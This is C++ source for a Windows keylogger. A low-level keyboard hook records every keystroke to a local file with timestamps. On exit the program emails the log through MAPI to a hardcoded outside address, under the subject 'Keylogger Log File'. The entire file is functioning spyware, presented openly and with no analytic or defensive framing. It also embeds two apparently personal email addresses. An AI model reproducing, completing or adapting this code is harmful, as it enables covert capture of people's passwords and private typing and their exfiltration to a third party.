#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <sstream>
#include <mapi.h>

#pragma comment(lib, "MAPI32.lib") // Link MAPI library

using namespace std;

// Add these definitions if not already present
#ifndef MAPI_LOGON_SHARED
#define MAPI_LOGON_SHARED 0x00000001
#endif

#ifndef MAPI_NO_MAIL_DIALOG
#define MAPI_NO_MAIL_DIALOG 0x00080000
#endif

HHOOK hHook = NULL;
ofstream outputFile;

time_t lastLogTime = 0; // Tracks the last logging time
bool isNewMinute = false;

const char* recipientEmail = "madhavanrx07@outlook.com"; 
const char* senderEmail = "juharishmadhavan2005@gmail.com"; 

// Map for Shift + Number to Special Characters
const char specialChars[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };

// Function to start a new log section with timestamp
void StartNewLogSection() {
    time_t now = time(NULL);
    tm* localTime = localtime(&now);

    if (isNewMinute) {
        outputFile << "\n--- New Minute: "
                   << (localTime->tm_hour) << ":"
                   << (localTime->tm_min) << ":"
                   << (localTime->tm_sec) << " ---\n";
        isNewMinute = false;
    }
}

// Function to check if a new minute has started
void CheckNewMinute() {
    time_t now = time(NULL);
    if (now / 60 != lastLogTime / 60) {
        isNewMinute = true;
        lastLogTime = now;
    }
}

// Function to send email with log file
bool SendEmailWithLog(const string& logFilePath) {
    // Use MapiLogon struct correctly
    ULONG ulUIParam = 0;
    LPSTR lpszProfileName = (LPSTR)"";
    LPSTR lpszPassword = NULL;
    FLAGS flFlags = MAPI_LOGON_SHARED | MAPI_NO_MAIL_DIALOG;
    LHANDLE lhSession = 0;

    // Attempt to log on
    ULONG result = MAPILogon(
        ulUIParam, 
        lpszProfileName, 
        lpszPassword, 
        flFlags, 
        0, 
        &lhSession
    );

    if (result != SUCCESS_SUCCESS) {
        cerr << "MAPI Logon Failed. Error code: " << result << endl;
        return false;
    }

    MapiMessage message = { 0 };

    // Recipient details
    MapiRecipDesc recipient = { 0 };
    recipient.ulRecipClass = MAPI_TO;
    recipient.lpszName = (LPSTR)recipientEmail;
    recipient.lpszAddress = (LPSTR)recipientEmail;

    // File attachment
    MapiFileDesc attachment = { 0 };
    attachment.nPosition = (ULONG)-1; // No text insertion
    attachment.lpszPathName = (LPSTR)logFilePath.c_str();

    // Email message
    message.lpszSubject = (LPSTR)"Keylogger Log File";
    message.lpszNoteText = (LPSTR)"Attached is the keylogger log file.";
    message.nRecipCount = 1;
    message.lpRecips = &recipient;
    message.nFileCount = 1;
    message.lpFiles = &attachment;

    // Send email
    result = MAPISendMail(
        lhSession, 
        0, 
        &message, 
        MAPI_SUPPRESS_ATTACH, 
        0
    );
    
    // Logoff after sending
    MAPILogoff(lhSession, 0, 0, 0);

    if (result == SUCCESS_SUCCESS) {
        cout << "Email sent successfully!" << endl;
        return true;
    } else {
        cerr << "Failed to send email. Error code: " << result << endl;
        return false;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyBoard->vkCode;

            // Check for Ctrl + Shift + Q to stop the hook
            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
                (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
                vkCode == 'Q') {
                PostQuitMessage(0);
            }

            CheckNewMinute();
            StartNewLogSection();

            // Handle special keys: Enter, Tab, Space
            if (vkCode == VK_RETURN) {
                outputFile << "\n"; // New line
            } else if (vkCode == VK_TAB) {
                outputFile << "    "; // 4 spaces
            } else if (vkCode == VK_SPACE) {
                outputFile << " "; // 1 space
            } else {
                // Get the state of the keyboard
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                // Check if Shift is pressed
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    keyboardState[VK_SHIFT] |= 0x80; // Set Shift state
                }

                // Handle Caps Lock
                if (GetKeyState(VK_CAPITAL) & 0x0001) {
                    keyboardState[VK_SHIFT] ^= 0x80; // Toggle Shift state
                }

                WCHAR buffer[5];
                int charLength = ToUnicode(vkCode, pKeyBoard->scanCode, keyboardState, buffer, 5, 0);

                if (charLength > 0) {
                    for (int i = 0; i < charLength; ++i) {
                        outputFile << char(buffer[i]); // Log the correct character
                    }
                }
            }
            outputFile.flush();
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        cerr << "Failed to install hook!" << endl;
    }
}

void ReleaseHook() {
    UnhookWindowsHookEx(hHook);
    outputFile.close();
}

int main() {
    outputFile.open("keylogs.txt", ios::out | ios::app);
    if (!outputFile.is_open()) {
        cerr << "Failed to open log file!" << endl;
        return 1;
    }

    lastLogTime = time(NULL); // Initialize the log time
    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Send log file before exiting
    ReleaseHook();
    if (!SendEmailWithLog("keylogs.txt")) {
        cerr << "Error: Failed to send email with log file." << endl;
    }

    return 0;
}
